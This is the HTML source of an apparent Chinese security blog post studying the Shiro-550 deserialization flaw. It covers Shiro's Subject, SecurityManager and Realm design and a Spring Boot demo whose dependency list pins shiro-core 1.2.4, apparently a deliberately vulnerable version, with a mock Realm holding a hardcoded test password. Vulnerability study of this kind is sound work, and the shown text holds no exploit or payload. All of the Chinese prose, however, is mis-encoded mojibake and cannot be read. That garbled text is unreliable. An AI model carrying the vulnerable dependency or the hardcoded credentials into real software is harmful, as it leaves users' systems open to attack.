<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Shiro 550æ¼æ´å­¦ä¹  | Reus09&#39;s Blog</title>
<meta name="keywords" content="ååºåˆ—åŒ–æ¼æ´">
<meta name="description" content="å‰è¨€ ä¹‹å‰å‚åŠ è¿‡æŠ¤ç½‘çš„é¢è¯•ï¼Œæ€»å–œæ¬¢é—®shiro-550æ¼æ´çš„åŸç†å’Œåˆ©ç”¨æ–¹å¼ï¼Œå†åŠ ä¸Šç°åœ¨åœ¨è¿›è¡ŒJAVAå®‰å…¨çš„å­¦ä¹ ï¼ŒShiroä½œä¸ºJavaå¼€å‘ä¸­ä¸€">
<meta name="author" content="Reus09">
<link rel="canonical" href="/posts/tech/shiro-550%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Shiro 550æ¼æ´å­¦ä¹ " />
<meta property="og:description" content="å‰è¨€ ä¹‹å‰å‚åŠ è¿‡æŠ¤ç½‘çš„é¢è¯•ï¼Œæ€»å–œæ¬¢é—®shiro-550æ¼æ´çš„åŸç†å’Œåˆ©ç”¨æ–¹å¼ï¼Œå†åŠ ä¸Šç°åœ¨åœ¨è¿›è¡ŒJAVAå®‰å…¨çš„å­¦ä¹ ï¼ŒShiroä½œä¸ºJavaå¼€å‘ä¸­ä¸€" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/tech/shiro-550%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-03-19T14:04:48+08:00" />
<meta property="article:modified_time" content="2023-03-19T14:04:48+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Shiro 550æ¼æ´å­¦ä¹ "/>
<meta name="twitter:description" content="å‰è¨€ ä¹‹å‰å‚åŠ è¿‡æŠ¤ç½‘çš„é¢è¯•ï¼Œæ€»å–œæ¬¢é—®shiro-550æ¼æ´çš„åŸç†å’Œåˆ©ç”¨æ–¹å¼ï¼Œå†åŠ ä¸Šç°åœ¨åœ¨è¿›è¡ŒJAVAå®‰å…¨çš„å­¦ä¹ ï¼ŒShiroä½œä¸ºJavaå¼€å‘ä¸­ä¸€"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "ğŸ“šæ–‡ç« ",
      "item": "/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯",
      "item": "/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Shiro 550æ¼æ´å­¦ä¹ ",
      "item": "/posts/tech/shiro-550%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Shiro 550æ¼æ´å­¦ä¹ ",
  "name": "Shiro 550æ¼æ´å­¦ä¹ ",
  "description": "å‰è¨€ ä¹‹å‰å‚åŠ è¿‡æŠ¤ç½‘çš„é¢è¯•ï¼Œæ€»å–œæ¬¢é—®shiro-550æ¼æ´çš„åŸç†å’Œåˆ©ç”¨æ–¹å¼ï¼Œå†åŠ ä¸Šç°åœ¨åœ¨è¿›è¡ŒJAVAå®‰å…¨çš„å­¦ä¹ ï¼ŒShiroä½œä¸ºJavaå¼€å‘ä¸­ä¸€",
  "keywords": [
    "ååºåˆ—åŒ–æ¼æ´"
  ],
  "articleBody": "å‰è¨€ ä¹‹å‰å‚åŠ è¿‡æŠ¤ç½‘çš„é¢è¯•ï¼Œæ€»å–œæ¬¢é—®shiro-550æ¼æ´çš„åŸç†å’Œåˆ©ç”¨æ–¹å¼ï¼Œå†åŠ ä¸Šç°åœ¨åœ¨è¿›è¡ŒJAVAå®‰å…¨çš„å­¦ä¹ ï¼ŒShiroä½œä¸ºJavaå¼€å‘ä¸­ä¸€ä¸ªå¾ˆé‡è¦çš„Javaå®‰å…¨æ¡†æ¶ï¼Œè¿™é‡Œä¹Ÿå°±è·Ÿè¿›å­¦ä¹ ä¸€ä¸‹shiroå­˜åœ¨çš„ä¸€äº›å†å²æ¼æ´ã€‚\næ ¹æ®å®˜æ–¹ç½‘ç«™ä¸Šçš„æ¼æ´é€šæŠ¥ï¼ŒShiro åœ¨å†å²ä¸Šå…±é€šæŠ¥äº† 11 ä¸ª CVEï¼Œé™¤äº† SHIRO-550 å’ŒSHIRO-721çš„ååºåˆ—åŒ–ä»¥åŠ CVE-2014-0074 çš„ ldap ç»•è¿‡ä¹‹å¤–ï¼Œå…¶ä»–çš„ç»•è¿‡éƒ½æ˜¯åœ¨è·¯å¾„å¤„ç†è¿‡ç¨‹ä¸­äº§ç”Ÿé—®é¢˜å¯¼è‡´çš„ç»•è¿‡ã€‚\nè¿™äº›ç»•è¿‡å¤šæ•°æ˜¯ç”±äº shiro çš„å¤„ç†é€»è¾‘æœ‰è¯¯ï¼Œæˆ–å’Œä¸­é—´ä»¶ã€å…¶ä»–æ¡†æ¶çš„å¤„ç†é€»è¾‘ä¸ä¸€è‡´å¯¼è‡´çš„å®‰å…¨é—®é¢˜ï¼Œé€šå¸¸ä¼šä¾èµ–åœºæ™¯ã€‚\nè¿™é‡Œå°±å…ˆå¯¹æœ€ç®€å•çš„shrio-550ä»¥å¥‘å­è¿›è¡Œå­¦ä¹ ,åŒæ—¶ç®€å•å­¦ä¹ ä¸€ä¸‹Shiroå…·ä½“æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚\nShiroç®€å•ä»‹ç» Shiroä¸»è¦å®ç°åŠŸèƒ½ Apache Shiro æ˜¯ä¸€ä¸ª Java å®‰å…¨æ¡†æ¶ï¼ŒåŒ…æ‹¬å¦‚ä¸‹åŠŸèƒ½å’Œç‰¹æ€§ï¼š\nAuthenticationï¼šèº«ä»½è®¤è¯/ç™»é™†ï¼ŒéªŒè¯ç”¨æˆ·æ˜¯ä¸æ˜¯æ‹¥æœ‰ç›¸åº”çš„èº«ä»½ã€‚åœ¨ Shiro ä¸­ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯åŸºäºå½“å‰æ­£åœ¨æ‰§è¡Œçš„ç”¨æˆ·ï¼Œè¿™é‡Œç§°ä¹‹ä¸ºä¸€ä¸ª Subjectï¼Œåœ¨ç”¨æˆ·ä»»æ„ä»£ç ä½ç½®éƒ½å¯ä»¥è½»æ˜“å–åˆ°è¿™ä¸ªSubjectã€‚Shiro æ”¯æŒæ•°æ®æºï¼Œç§°ä¹‹ä¸º Realmsï¼Œå¯ä»¥åˆ©ç”¨å…¶è¿æ¥ LDAP\\AD\\JDBC ç­‰å®‰å…¨æ•°æ®æºï¼Œå¹¶æ”¯æŒä½¿ç”¨è‡ªå®šä¹‰çš„ Realmsï¼Œå¹¶å¯ä»¥åŒæ—¶ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ª Realms å¯¹ä¸€ä¸ªç”¨æˆ·è¿›è¡Œè®¤è¯ï¼Œè®¤è¯è¿‡ç¨‹å¯ä»¥ä½¿ç”¨é…ç½®æ–‡ä»¶é…ç½®ï¼Œæ— éœ€ä¿®æ”¹ä»£ç ã€‚åŒæ—¶ï¼ŒShiro è¿˜æ”¯æŒ RememberMeï¼Œè®°ä½åä¸‹æ¬¡è®¿é—®å°±æ— éœ€ç™»å½•ã€‚ Authorizationï¼šæˆæƒï¼Œå³æƒé™éªŒè¯ï¼ŒéªŒè¯æŸä¸ªå·²è®¤è¯çš„ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰æŸä¸ªæƒé™ã€‚åŒæ ·åŸºäº Subjectã€æ”¯æŒå¤šç§ Realmsã€‚Shiro æ”¯æŒ Wildcard Permissions ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨é€šé…ç¬¦æ¥å¯¹æƒé™éªŒè¯è¿›è¡Œå»ºæ¨¡ï¼Œä½¿æƒé™é…ç½®ç®€å•æ˜“è¯»ã€‚Shiro æ”¯æŒåŸºäº Roles å’ŒåŸºäº Permissions ä¸¤ç§æ–¹å¼çš„éªŒè¯ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œä½¿ç”¨ã€‚å¹¶ä¸”æ”¯æŒç¼“å­˜äº§å“çš„ä½¿ç”¨ã€‚ Session Managerï¼šä¼šè¯ç®¡ç†ï¼Œç”¨æˆ·ç™»é™†åå°±æ˜¯ä¸€æ¬¡ä¼šè¯ï¼Œåœ¨æ²¡æœ‰é€€å‡ºä¹‹å‰ï¼Œå®ƒçš„æ‰€æœ‰ä¿¡æ¯éƒ½åœ¨ä¼šè¯ä¸­ã€‚Shiro ä¸­çš„ä¸€åˆ‡ï¼ˆåŒ…æ‹¬ä¼šè¯å’Œä¼šè¯ç®¡ç†çš„æ‰€æœ‰æ–¹é¢ï¼‰éƒ½æ˜¯åŸºäºæ¥å£çš„ï¼Œå¹¶ä½¿ç”¨ POJO å®ç°ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ä»»ä½•ä¸ JavaBeans å…¼å®¹çš„é…ç½®æ ¼å¼ï¼ˆå¦‚ JSONã€YAMLã€Spring XML æˆ–ç±»ä¼¼æœºåˆ¶ï¼‰è½»æ¾é…ç½®æ‰€æœ‰ä¼šè¯ç»„ä»¶ã€‚Session æ”¯æŒç¼“å­˜é›†ç¾¤çš„æ–¹å¼ï¼›è¿˜æ”¯æŒäº‹ä»¶ä¾¦å¬å™¨ï¼Œå…è®¸åœ¨ä¼šè¯çš„ç”Ÿå‘½å‘¨æœŸå†…ä¾¦å¬ç”Ÿå‘½å‘¨æœŸäº‹ä»¶ï¼Œä»¥æ‰§è¡Œç›¸å…³é€»è¾‘ã€‚Shiro Sessions ä¿ç•™å‘èµ·ä¼šè¯çš„ä¸»æœºçš„ IP åœ°å€ï¼Œå› æ­¤å¯ä»¥æ ¹æ®ç”¨æˆ·ä½ç½®æ¥æ‰§è¡Œä¸åŒé€»è¾‘ã€‚Shiro å¯¹ Web æ”¯æŒå®ç°äº† HttpSession ç±»åŠç›¸å…³å…¨éƒ¨ APIã€‚ä¹Ÿå¯ä»¥åœ¨ SSO ä¸­ä½¿ç”¨ã€‚ Cryptographyï¼šåŠ å¯†ï¼Œä¿æŠ¤æ•°æ®çš„å®‰å…¨æ€§ï¼›Shiro ä¸“æ³¨äºä½¿ç”¨å…¬ç§é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä»¥åŠå¯¹å¯†ç ç­‰æ•°æ®è¿›è¡Œä¸å¯é€†çš„å“ˆå¸Œã€‚ Permissionsï¼šç”¨æˆ·æƒé™ï¼›Shiro å°†æ‰€æœ‰çš„æ“ä½œéƒ½æŠ½è±¡ä¸º Permissionï¼Œå¹¶é»˜è®¤ä½¿ç”¨ Wildcard Permissions æ¥è¿›è¡ŒåŒ¹é…ã€‚Shiro æ”¯æŒå®ä¾‹çº§åˆ«çš„æƒé™æ§åˆ¶æ ¡éªŒï¼Œä¾‹å¦‚domain:action:instanceã€‚ Cachingï¼šç¼“å­˜ï¼Œä¸ºäº†æé«˜ Shiro åœ¨ä¸šåŠ¡ä¸­çš„æ€§èƒ½è¡¨ç°ã€‚Shiro çš„ç¼“å­˜æ”¯æŒåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªå°è£…çš„ APIï¼Œç”±ç”¨æˆ·è‡ªè¡Œé€‰æ‹©åº•å±‚çš„ç¼“å­˜æ–¹å¼ã€‚ç¼“å­˜ä¸­æœ‰ä¸‰ä¸ªé‡è¦çš„æ¥å£ CacheManager/Cache/CacheManagerAware ï¼ŒShiro æä¾›äº†é»˜è®¤çš„ MemoryConstrainedCacheManager ç­‰å®ç°ã€‚ shiroä¸»è¦çš„ç±» Shiro æ¶æ„ä¸­ä¸»è¦æœ‰ä¸‰ä¸ªæ ¸å¿ƒçš„æ¦‚å¿µï¼šSubject, SecurityManager, Realmsã€‚\nSubjectï¼šä»£è¡¨å½“å‰çš„ç”¨æˆ·\nSecurityManagerï¼šç®¡ç†è€…æ‰€æœ‰çš„ Subject ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£ä¸­æè¿°å…¶ä¸º Shiro æ¶æ„çš„æ ¸å¿ƒ\nRealmsï¼šSecurityManagerçš„è®¤è¯å’Œæˆæƒéœ€è¦ä½¿ç”¨Realmï¼ŒRealmè´Ÿè´£è·å–ç”¨æˆ·çš„æƒé™å’Œè§’è‰²ç­‰ä¿¡æ¯ï¼Œå†è¿”å›ç»™SecurityManageræ¥è¿›è¡Œåˆ¤æ–­ï¼Œåœ¨é…ç½® Shiro çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¿…é¡»æŒ‡å®šè‡³å°‘ä¸€ä¸ªRealm æ¥å®ç°è®¤è¯ï¼ˆauthenticationï¼‰å’Œ/æˆ–æˆæƒï¼ˆauthorizationï¼‰\nå¯¹äºShiroæ¥è¯´ï¼Œä¸€æ¬¡è®¤è¯åŠæˆæƒçš„æ ¡éªŒæµç¨‹ï¼š\nåº”ç”¨ç¨‹åºé€šè¿‡è·å–å½“å‰è®¿é—®çš„ Subjectï¼ˆä¹Ÿå°±æ˜¯ç”¨æˆ·ï¼‰ï¼Œå¹¶è°ƒç”¨å…¶ç›¸åº”æ ¡éªŒæ–¹æ³•ï¼› Subject å°†æ ¡éªŒå§”æ‰˜ç»™ SecurityManager è¿›è¡Œåˆ¤æ–­ï¼› SecurityManager ä¼šè°ƒç”¨ Realm æ¥è·å–ä¿¡æ¯æ¥åˆ¤æ–­ç”¨æˆ·å¯¹åº”çš„è§’è‰²èƒ½å¦è¿›è¡Œæ“ä½œã€‚ SecurityManager org.apache.shiro.mgt.SecurityManager æ˜¯ shiro çš„ä¸€ä¸ªæ ¸å¿ƒæ¥å£ï¼Œæ¥å£è´Ÿè´£äº†ä¸€ä¸ª Subject ä¹Ÿå°±æ˜¯â€œç”¨æˆ·â€çš„å…¨éƒ¨å®‰å…¨æ“ä½œï¼š\næ¥å£æœ¬èº«å®šä¹‰äº† createSubjectã€loginã€logout ä¸‰ä¸ªæ–¹æ³•ç”¨æ¥åˆ›å»º Subjectã€ç™»é™†å’Œé€€å‡ºã€‚ æ‰©å±•äº† org.apache.shiro.authc.Authenticator æ¥å£ï¼Œæä¾›äº† authenticate æ–¹æ³•ç”¨æ¥è¿›è¡Œè®¤è¯ã€‚ æ‰©å±•äº† org.apache.shiro.authz.Authorizer æ¥å£ï¼Œæä¾›äº†å¯¹ Permission å’Œ Role çš„æ ¡éªŒæ–¹æ³•ã€‚åŒ…æ‹¬ has/is/check ç›¸å…³å‘½åçš„æ–¹æ³•ã€‚ æ‰©å±•äº† org.apache.shiro.session.mgt.SessionManager æ¥å£ï¼Œæä¾›äº† startã€getSession æ–¹æ³•ç”¨æ¥åˆ›å»ºå¯è·å–ä¼šè¯ã€‚ Shiro ä¸º SecurityManager æä¾›äº†ä¸€ä¸ªåŒ…å«äº†ä¸Šè¿°æ‰€æœ‰åŠŸèƒ½çš„é»˜è®¤å®ç°ç±» org.apache.shiro.mgt.DefaultSecurityManagerï¼Œä¸­é—´ç»§æ‰¿äº†å¾ˆå¤šä¸­é—´ç±»ï¼Œå¹¶é€å±‚å®ç°äº†ç›¸å…³çš„æ–¹æ³•ï¼Œç»§æ‰¿å…³ç³»å¦‚ä¸‹å›¾ã€‚\nDefaultSecurityManager è¿˜æœ‰ä¸€ä¸ªå­ç±»ï¼Œå°±æ˜¯ org.apache.shiro.web.mgt.DefaultWebSecurityManagerï¼Œè¿™ä¸ªç±»åœ¨ shiro-web åŒ…ä¸­ï¼Œæ˜¯ Shiro ä¸º HTTP/SOAP ç­‰ http åè®®è¿æ¥æä¾›çš„å®ç°ç±»ï¼Œè¿™ä¸ªç±»é»˜è®¤åˆ›å»ºé…ç½®äº† org.apache.shiro.web.mgt.CookieRememberMeManager ç”¨æ¥æä¾› RememberMe ç›¸å…³åŠŸèƒ½ã€‚\næˆ‘ä»¬å¦‚æœä½¿ç”¨springæˆ–è€…springbootç­‰æ¡†æ¶è¿›è¡Œæ•´åˆShiroçš„æ—¶å€™ï¼Œåœ¨è®¾å®šSecurityManagerå¯¹åº”çš„Realmæ—¶ï¼Œéœ€è¦å£°æ˜ä½¿ç”¨çš„ç±»ä¸º:DefaultWebSecurityManagerã€‚\nSubject org.apache.shiro.subject.Subject æ˜¯ä¸€ä¸ªæ¥å£ï¼Œç”¨æ¥è¡¨ç¤ºåœ¨ Shiro ä¸­çš„ä¸€ä¸ªç”¨æˆ·ã€‚å› ä¸ºåœ¨å¤ªå¤šç»„ä»¶ä¸­éƒ½ä½¿ç”¨äº† User çš„æ¦‚å¿µï¼Œæ‰€ä»¥ Shiro æ•…æ„é¿å¼€äº†è¿™ä¸ªå…³é”®å­—ï¼Œä½¿ç”¨äº† Subjectã€‚\nSubject æ¥å£åŒæ ·æä¾›äº†è®¤è¯ï¼ˆlogin/logoutï¼‰ã€æˆæƒï¼ˆè®¿é—®æ§åˆ¶ has/is/check æ–¹æ³•ï¼‰ä»¥åŠè·å–ä¼šè¯çš„èƒ½åŠ›ã€‚åœ¨åº”ç”¨ç¨‹åºä¸­å¦‚æœæƒ³è¦è·å–ä¸€ä¸ªå½“å‰çš„ Subjectï¼Œé€šå¸¸ä½¿ç”¨ SecurityUtils.getSubject() æ–¹æ³•å³å¯ã€‚\nå®é™…ä¸Šï¼ŒSubject æ¥å£åœ¨ core åŒ…ä¸­çš„å®ç°ç±» org.apache.shiro.subject.support.DelegatingSubject æœ¬è´¨ä¸Šä¹Ÿå°±æ˜¯ä¸€ä¸ª SecurityManager çš„ä»£ç†ç±»ã€‚\nDelegatingSubject ä¸­ä¿å­˜äº†ä¸€ä¸ª transient ä¿®é¥°çš„ SecurityManager æˆå‘˜å˜é‡ï¼Œåœ¨ä½¿ç”¨å…·ä½“çš„æ ¡éªŒæ–¹æ³•æ—¶ï¼Œå®é™…ä¸Šå§”æ‰˜ SecurityManager è¿›è¡Œå¤„ç†ï¼Œå¦‚ä¸‹å›¾ï¼š\nDelegatingSubject ä¸­ä¸ä¼šä¿å­˜å’Œç»´æŒä¸€ä¸ªç”¨æˆ·çš„â€œçŠ¶æ€ï¼ˆè§’è‰²/æƒé™ï¼‰â€ï¼Œæ°æ°ç›¸åï¼Œæ¯æ¬¡å®ƒéƒ½ä¾èµ–äºåº•å±‚çš„å®ç°ç»„ä»¶ SecurityManager è¿›è¡Œæ£€æŸ¥å’Œæ ¡éªŒï¼Œå› æ­¤é€šå¸¸ä¼šè¦æ±‚ SecurityManager çš„å®ç°ç±»æ¥æä¾›ä¸€äº›ç¼“å­˜æœºåˆ¶ã€‚\nRealm org.apache.shiro.realm.Realm æ˜¯ Shiro ä¸­çš„ä¸€ä¸ªæ¥å£ï¼ŒShiro é€šè¿‡ Realm æ¥è®¿é—®æŒ‡å®šåº”ç”¨çš„å®‰å…¨å®ä½“â€”â€”ç”¨æˆ·ã€è§’è‰²ã€æƒé™ç­‰ã€‚ä¸€ä¸ª Realm é€šå¸¸ä¸ä¸€ä¸ªæ•°æ®æºæœ‰ 1 å¯¹ 1 çš„å¯¹åº”å…³ç³»ï¼Œå¦‚å…³ç³»å‹æ•°æ®åº“ã€æ–‡ä»¶ç³»ç»Ÿæˆ–è€…å…¶ä»–ç±»ä¼¼çš„èµ„æºã€‚\nå®é™…ä¸Šï¼Œä¸€ä¸ªSubjectæŸ¥è¯¢æ˜¯å¦æƒé™ã€è§’è‰²çš„æ—¶å€™ï¼Œæ˜¯äº¤ä»˜ç»™åº•å±‚çš„SecurityManagerï¼Œè€ŒSecurityManageræ˜¯é€šè¿‡å…¶è®¾å®šçš„Realmä¸­å®šä¹‰çš„è§„åˆ™ã€æƒé™æ¥å®ç°æˆæƒã€è®¤è¯çš„ã€‚\nåœ¨ä½¿ç”¨ä¸­ï¼Œå¼€å‘äººå‘˜é€šå¸¸ä¸ä¼šç›´æ¥å®ç° Realm æ¥å£ï¼Œè€Œæ˜¯å®ç° Shiro æä¾›äº†ä¸€äº›ç›¸å…³åŠŸèƒ½çš„æŠ½è±¡ç±» AuthenticatingRealm/AuthorizingRealmï¼Œæˆ–è€…ä½¿ç”¨é’ˆå¯¹ç‰¹å®šæ•°æ®æºæä¾›çš„å®ç°ç±»å¦‚ JndiLdapRealm/JdbcRealm/PropertiesRealm/TextConfigurationRealm/IniRealm ç­‰ç­‰ã€‚ç»§æ‰¿å…³ç³»å¤§æ¦‚å¦‚ä¸‹ï¼š\nè¾ƒå¤šæƒ…å†µä¸‹ï¼Œå¼€å‘äººå‘˜ä¼šè‡ªè¡Œå®ç° AuthorizingRealm ç±»ï¼Œå¹¶é‡å†™ doGetAuthorizationInfo/doGetAuthenticationInfo æ–¹æ³•æ¥è‡ªè¡Œå®ç°è‡ªèº«çš„è®¤è¯å’Œæˆæƒé€»è¾‘ã€‚\nShiroç®€å•ä½¿ç”¨ ä¸ºäº†ç®€åŒ–æ“ä½œçš„æµç¨‹ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥ä½¿ç”¨springbootè¿›è¡Œæ•´åˆShiroã€‚\né€šè¿‡mavenå¯¼å…¥ç›¸å…³ä¾èµ–ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 org.apache.shiro shiro-web 1.6.0 org.apache.shiro shiro-core 1.2.4 org.apache.shiro shiro-spring 1.4.0 ç„¶åå®šä¹‰æˆ‘ä»¬è‡ªå·±çš„æˆæƒã€è®¤è¯çš„Realmã€‚\nè®¤è¯çš„ç”¨æˆ·è´¦æˆ·åä¸ºreus09,å¯†ç ä¸ºpasswordã€‚ å¹¶ä¸”å…¶æ‹¥æœ‰ä¸¤ä¸ªRole:admin,userã€‚ adminæ‹¥æœ‰addæƒé™ï¼Œuseræ‹¥æœ‰deleteæƒé™ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 public class MyShiroRealm extends AuthorizingRealm { /** * æ¨¡æ‹Ÿæ•°æ®åº“æ•°æ® */ Map userMap = new HashMap\u003c\u003e(16); { userMap.put(\"reus09\", \"123456\"); super.setName(\"myShiroRealm\"); // è®¾ç½®è‡ªå®šä¹‰Realmçš„åç§°ï¼Œå–ä»€ä¹ˆæ— æ‰€è°“.. } /** * æˆæƒ * @param principalCollection * @return */ @Override protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) { String userName = (String) principalCollection.getPrimaryPrincipal(); Set roles = getRolesByUserName(userName); Set permissions = getPermissionsByUserName(userName); SimpleAuthorizationInfo simpleAuthorizationInfo = new SimpleAuthorizationInfo(); simpleAuthorizationInfo.setRoles(roles); simpleAuthorizationInfo.setStringPermissions(permissions); return simpleAuthorizationInfo; } /** * æ¨¡æ‹Ÿä»æ•°æ®åº“ä¸­è·å–æƒé™æ•°æ® * * @param userName * @return */ private Set getPermissionsByUserName(String userName) { Set permissions = new HashSet\u003c\u003e(); permissions.add(\"user:delete\"); permissions.add(\"admin:add\"); return permissions; } /** * æ¨¡æ‹Ÿä»æ•°æ®åº“ä¸­è·å–è§’è‰²æ•°æ® * * @param userName * @return */ private Set getRolesByUserName(String userName) { Set roles = new HashSet\u003c\u003e(); roles.add(\"admin\"); roles.add(\"user\"); return roles; } @Override protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException { String username = (String) authenticationToken.getPrincipal(); String password = getPasswordByUsername(username); if(password == null){ return null; }else{ return new SimpleAuthenticationInfo(username,password,\"myShiroRealm\"); } } public String getPasswordByUsername(String username){ return userMap.get(username); } } åŒæ—¶æˆ‘ä»¬æ¥å®šä¹‰login,index,logoutä¸‰ä¸ªè·¯ç”±æ¥ä½œä¸ºæˆ‘ä»¬æµ‹è¯•ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 @Controller public class HelloController { @RequestMapping(\"/index\") @ResponseBody public String index(){ return \"hello , this is demo\"; } @ResponseBody @RequestMapping(\"/login\") public String login(String username , String password){ Subject subject = SecurityUtils.getSubject(); UsernamePasswordToken usernamePasswordToken = new UsernamePasswordToken(username, password); try { subject.login(usernamePasswordToken); return \"hello, this is demo\"; } catch (Exception ex){ return \"sorry, ä½ è¿˜æ²¡æœ‰ç™»å½•\"; } } @ResponseBody @RequestMapping(\"/403\") public String unAuthorized(){ return \"403 no Authorized\"; } @RequestMapping(\"/logout\") public String logout(){ return \"forward:/login\"; } } åœ¨ Servlet é¡¹ç›®ä¸­ï¼Œæ˜¯é€šè¿‡åœ¨ web.xml ä¸­é…ç½®äº†èƒ½åŒ¹é…æ‰€æœ‰ URL è·¯å¾„ /* çš„ ShiroFilterï¼Œå¹¶ç”±å…¶æ‰§è¡Œåç»­é€»è¾‘ã€‚è€Œåœ¨ Spring ç”Ÿæ€ä¸‹ï¼Œç”±äº IoC ä¸ DI çš„æ€æƒ³ï¼Œé€šå¸¸æŠŠæ‰€æœ‰çš„ Filter æ³¨å†Œæˆä¸º Bean äº¤ç»™ Spring æ¥ç®¡ç†ã€‚\næ­¤æ—¶å¦‚æœæƒ³è¦å°† Shiro é€»è¾‘æ³¨å…¥å…¶ä¸­ï¼Œå°±ç”¨åˆ°äº†å…³é”®ç±»ï¼šShiroFilterFactoryBeanã€‚è¿™æ˜¯ Shiro ä¸º Spring ç”Ÿæ€æä¾›çš„å·¥å‚ç±»ï¼Œç”±å®ƒåœ¨ spring ä¸­æ‰¿æ‹…äº†ä¹‹å‰ ShiroFilter çš„è§’è‰²ã€‚\nå› æ­¤æ¥é…ç½®æˆ‘ä»¬çš„shiro Filteræ¥å®ç°ç”¨æˆ·è®¤è¯è¿‡ç¨‹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 @Configuration public class ShiroConfig { @Bean public ShiroFilterFactoryBean shiroFilter(SecurityManager securityManager){ ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean(); shiroFilterFactoryBean.setSecurityManager((SecurityManager) securityManager); // æ‹¦æˆªå™¨ Map filterChainDefinitionMap = new LinkedHashMap\u003c\u003e(); // filterChainDefinitionMap.put(\"/static/**\",\"anno\"); filterChainDefinitionMap.put(\"/logout\",\"logout\"); filterChainDefinitionMap.put(\"/**\",\"authc\"); shiroFilterFactoryBean.setLoginUrl(\"/login\"); shiroFilterFactoryBean.setSuccessUrl(\"/index\"); shiroFilterFactoryBean.setUnauthorizedUrl(\"/403\"); shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap); return shiroFilterFactoryBean; } @Bean public MyShiroRealm myShiroRealm(){ return new MyShiroRealm(); } @Bean public SecurityManager securityManager(){ DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager(); securityManager.setRealm(myShiroRealm()); return securityManager; } } 